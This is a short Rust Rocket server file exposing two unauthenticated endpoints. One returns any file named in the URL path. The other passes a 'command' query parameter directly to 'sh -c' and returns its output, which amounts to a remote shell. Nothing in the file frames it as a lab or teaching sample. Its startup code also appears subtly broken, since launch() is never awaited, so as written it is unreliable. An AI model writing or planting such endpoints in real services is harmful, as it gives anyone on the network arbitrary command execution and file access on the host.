use rocket::{get, routes};

#[get("/files/<name..>")]
fn read(name: std::path::PathBuf) -> String {
    std::fs::read_to_string(name).unwrap()
}

#[get("/run?<command>")]
fn run(command: &str) -> String {
    format!("{:?}", std::process::Command::new("sh").arg("-c").arg(command).output())
}

fn main() {
    rocket::build().mount("/api", routes![read, run]).launch();
}
